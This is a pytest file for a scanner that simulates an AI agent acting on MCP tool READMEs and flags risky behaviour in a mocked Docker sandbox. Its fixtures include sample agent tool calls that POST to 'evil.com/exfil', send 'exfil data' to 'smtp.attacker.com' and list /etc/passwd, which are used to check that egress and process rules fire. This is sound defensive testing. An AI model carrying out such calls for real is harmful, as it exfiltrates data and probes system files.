"""
test_layer3_agent_integration.py
─────────────────────────────────
Mock-based integration tests for the Layer 3 agent simulation path.

Exercises the full pipeline:
  README manifest → AgentSimulator (mocked) → ToolCallTranslator
    → DockerSandboxExecutor.run_script() (mocked) → TraceAnalyzer → RiskReport_L3

No live Docker daemon or Anthropic API required.  The mock executor returns
a canned ExecutionTrace; the real TraceAnalyzer is exercised against it.
"""
from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from scanner.layer3_dynamic import Layer3DynamicAnalyzer
from scanner.models.risk_report import ExecutionTrace, RiskReport_L3
from scanner.models.skill_manifest import Framework, Permission, SkillManifest, ToolDefinition


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _make_manifest(readme: str | None = None, *perms: Permission) -> SkillManifest:
    """Build a no-tools manifest (README-only context)."""
    return SkillManifest(framework=Framework.MCP, tools=[], readme_text=readme)


def _make_executor(trace: ExecutionTrace) -> MagicMock:
    """Mock executor with both .run() and .run_script() returning *trace*."""
    mock = MagicMock()
    mock.run.return_value = trace
    mock.run_script.return_value = trace
    return mock


def _make_agent_client(tool_calls: list[dict]) -> MagicMock:
    """Mock anthropic.Anthropic client returning *tool_calls* as tool_use blocks."""
    blocks = []
    for tc in tool_calls:
        block = MagicMock()
        block.type = "tool_use"
        block.id = "toolu_" + tc["name"]
        block.name = tc["name"]
        block.input = tc["input"]
        blocks.append(block)

    msg = MagicMock()
    msg.content = blocks

    client = MagicMock()
    client.messages.create.return_value = msg
    return client


# ─── agent_simulation_executed metadata tests ─────────────────────────────────

class TestAgentSimulationMetadata:
    def test_agent_simulation_executed_true_for_readme_path(self) -> None:
        """agent_simulation_executed=True whenever the README path is taken."""
        analyzer = Layer3DynamicAnalyzer(
            executor=_make_executor(ExecutionTrace()),
            agent_client=_make_agent_client([]),
        )
        report = analyzer.analyze(_make_manifest("some readme"), MagicMock(), source_path=None)
        assert report.agent_simulation_executed is True

    def test_agent_simulation_executed_false_for_python_path(self, tmp_path: Path) -> None:
        """Python source path → old execution flow, agent_simulation_executed stays False."""
        py_file = tmp_path / "tool.py"
        py_file.write_text("def run(): pass\n")
        analyzer = Layer3DynamicAnalyzer(
            executor=_make_executor(ExecutionTrace()),
            agent_client=MagicMock(),
        )
        report = analyzer.analyze(_make_manifest("readme"), MagicMock(), source_path=py_file)
        assert report.agent_simulation_executed is False

    def test_agent_tool_call_count_zero_when_no_calls(self) -> None:
        """agent_tool_call_count=0 when agent makes no tool calls (benign README)."""
        analyzer = Layer3DynamicAnalyzer(
            executor=_make_executor(ExecutionTrace()),
            agent_client=_make_agent_client([]),
        )
        report = analyzer.analyze(_make_manifest("benign readme"), MagicMock(), source_path=None)
        assert report.agent_tool_call_count == 0

    def test_agent_tool_call_count_reflects_calls(self) -> None:
        """agent_tool_call_count = tool_calls per API response × 2 synthetic inputs."""
        # Mock returns 2 tool_use blocks per call × 2 calls = 4 total
        agent_client = _make_agent_client([
            {"name": "run_command", "input": {"command": "ls -la"}},
            {"name": "run_command", "input": {"command": "id"}},
        ])
        analyzer = Layer3DynamicAnalyzer(
            executor=_make_executor(ExecutionTrace()),
            agent_client=agent_client,
        )
        report = analyzer.analyze(_make_manifest("run commands"), MagicMock(), source_path=None)
        assert report.agent_tool_call_count == 4

    def test_agent_simulation_executed_false_when_no_readme(self) -> None:
        """No readme_text → empty report immediately, agent_simulation_executed stays False."""
        agent_client = MagicMock()
        analyzer = Layer3DynamicAnalyzer(
            executor=MagicMock(),
            agent_client=agent_client,
        )
        report = analyzer.analyze(
            SkillManifest(framework=Framework.MCP, tools=[], readme_text=None),
            MagicMock(),
            source_path=None,
        )
        assert report.agent_simulation_executed is False
        agent_client.messages.create.assert_not_called()


# ─── Rule firing tests ────────────────────────────────────────────────────────

class TestAgentSimulationRuleFiring:
    def test_http_request_tool_call_fires_l3_dyn_004(self) -> None:
        """
        Agent calls http_request → ToolCallTranslator generates socket.connect code
        → executor returns trace with network_connect_attempts → L3-DYN-004 fires.
        """
        trace = ExecutionTrace(network_connect_attempts=["('evil.com', 443)"])
        executor = _make_executor(trace)
        agent_client = _make_agent_client([
            {"name": "http_request", "input": {"url": "https://evil.com/exfil", "method": "POST"}},
        ])
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        report = analyzer.analyze(_make_manifest("exfiltrate data"), MagicMock(), source_path=None)

        assert report.undeclared_network_egress is True
        assert any(m.rule_id == "L3-DYN-004" for m in report.matches)

    def test_run_command_tool_call_fires_l3_dyn_001(self) -> None:
        """
        Agent calls run_command → subprocess.run in script → trace has processes_spawned
        → L3-DYN-001 fires.
        """
        trace = ExecutionTrace(processes_spawned=["ls -la /etc/passwd"])
        executor = _make_executor(trace)
        agent_client = _make_agent_client([
            {"name": "run_command", "input": {"command": "ls -la /etc/passwd"}},
        ])
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        report = analyzer.analyze(_make_manifest("run system command"), MagicMock(), source_path=None)

        assert report.execve_detected is True
        assert any(m.rule_id == "L3-DYN-001" for m in report.matches)

    def test_send_message_tool_call_fires_l3_dyn_004(self) -> None:
        """send_message → socket.connect(recipient,25) → L3-DYN-004 network egress."""
        trace = ExecutionTrace(network_connect_attempts=["('smtp.attacker.com', 25)"])
        executor = _make_executor(trace)
        agent_client = _make_agent_client([
            {"name": "send_message", "input": {"recipient": "smtp.attacker.com", "body": "exfil data"}},
        ])
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        report = analyzer.analyze(_make_manifest("send to external"), MagicMock(), source_path=None)

        assert report.undeclared_network_egress is True

    def test_no_tool_calls_no_rule_matches(self) -> None:
        """Benign README: agent makes no tool calls → no Docker execution → empty report."""
        executor = _make_executor(ExecutionTrace())
        agent_client = _make_agent_client([])
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        report = analyzer.analyze(_make_manifest("# Safe tool\nDoes only search."), MagicMock(), source_path=None)

        assert report.matches == []
        assert report.undeclared_network_egress is False
        executor.run_script.assert_not_called()

    def test_run_script_called_when_tool_calls_present(self) -> None:
        """DockerSandboxExecutor.run_script() is invoked (not run()) for agent sim."""
        trace = ExecutionTrace(network_connect_attempts=["('a.com', 443)"])
        executor = _make_executor(trace)
        agent_client = _make_agent_client([
            {"name": "http_request", "input": {"url": "https://a.com/data", "method": "GET"}},
        ])
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        analyzer.analyze(_make_manifest("exfil readme"), MagicMock(), source_path=None)

        executor.run_script.assert_called_once()
        executor.run.assert_not_called()


# ─── Python path backward-compatibility tests ─────────────────────────────────

class TestPythonPathUnchanged:
    def test_python_source_uses_run_not_run_script(self, tmp_path: Path) -> None:
        """Python source → executor.run() is called, run_script() is not."""
        py_file = tmp_path / "tool.py"
        py_file.write_text("def run(): pass\n")

        executor = _make_executor(ExecutionTrace())
        agent_client = MagicMock()
        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        analyzer.analyze(_make_manifest("readme"), MagicMock(), source_path=py_file)

        executor.run.assert_called_once()
        executor.run_script.assert_not_called()

    def test_python_path_does_not_call_agent_client(self, tmp_path: Path) -> None:
        """Python source path never invokes the Anthropic API."""
        py_file = tmp_path / "tool.py"
        py_file.write_text("x = 1\n")

        agent_client = MagicMock()
        analyzer = Layer3DynamicAnalyzer(
            executor=_make_executor(ExecutionTrace()),
            agent_client=agent_client,
        )
        analyzer.analyze(_make_manifest("readme"), MagicMock(), source_path=py_file)

        agent_client.messages.create.assert_not_called()


# ─── Fail-open tests ──────────────────────────────────────────────────────────

class TestLayer3AgentFailOpen:
    def test_fail_open_on_api_error_returns_report_with_sim_executed(self) -> None:
        """
        API error → AgentSimulator.simulate() returns empty result (fail-open)
        → _run_agent_simulation returns RiskReport_L3(agent_simulation_executed=True)
        → no exception propagates to caller.
        """
        client = MagicMock()
        client.messages.create.side_effect = RuntimeError("API down")
        analyzer = Layer3DynamicAnalyzer(
            executor=MagicMock(),
            agent_client=client,
        )
        report = analyzer.analyze(_make_manifest("malicious readme"), MagicMock(), source_path=None)

        assert isinstance(report, RiskReport_L3)
        # AgentSimulator fail-open returns empty result → agent_simulation_executed=True
        assert report.agent_simulation_executed is True
        assert report.agent_tool_call_count == 0

    def test_fail_open_on_docker_error(self) -> None:
        """Docker executor raising → outer fail-open → empty RiskReport_L3."""
        agent_client = _make_agent_client([
            {"name": "http_request", "input": {"url": "https://evil.com", "method": "GET"}},
        ])
        executor = MagicMock()
        executor.run_script.side_effect = RuntimeError("Docker not available")

        analyzer = Layer3DynamicAnalyzer(executor=executor, agent_client=agent_client)
        report = analyzer.analyze(_make_manifest("malicious readme"), MagicMock(), source_path=None)

        # Outer fail-open in analyze() catches the error
        assert isinstance(report, RiskReport_L3)
        assert report.matches == []
